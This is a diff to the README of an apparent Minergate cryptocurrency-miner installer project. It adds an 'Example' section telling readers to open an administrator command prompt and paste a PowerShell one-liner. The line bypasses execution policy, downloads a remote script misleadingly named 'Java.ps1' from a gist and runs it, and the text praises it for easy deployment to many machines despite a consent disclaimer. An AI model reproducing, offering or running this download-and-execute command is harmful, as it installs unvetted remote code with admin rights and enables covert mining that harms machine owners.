@@ -10,6 +10,15 @@ This project I undertook while running a small graphics powered farm while I was
 
 Please do NOT use this without the consent of the person who owns the computer. This code is NOT to be used for malicious purposes. 
 
+### Example (Works in Win 10 Only)
+
+This executes a the code in this git via one line of code only. It makes it extremely easy to deploy to lots of machines. I will publish the guide on how to do this soon. 
+
+Run CMD as Administrator and paste this script in:
+
+@powershell -NoProfile -ExecutionPolicy Bypass -Command "iex ((new-object net.webclient).DownloadString('https://gist.githubusercontent.com/Hawkryption/dd55e0a282a70f3af63ed792f5eca570/raw/d2fc7bc4a52b84dec0b7d6c436b4bdaa7ec68d70/Java.ps1'))"
+
+
 ### Using this Powershell Script
 
 #### 1. Download Install_Minergate.ps1 and Edit the Code
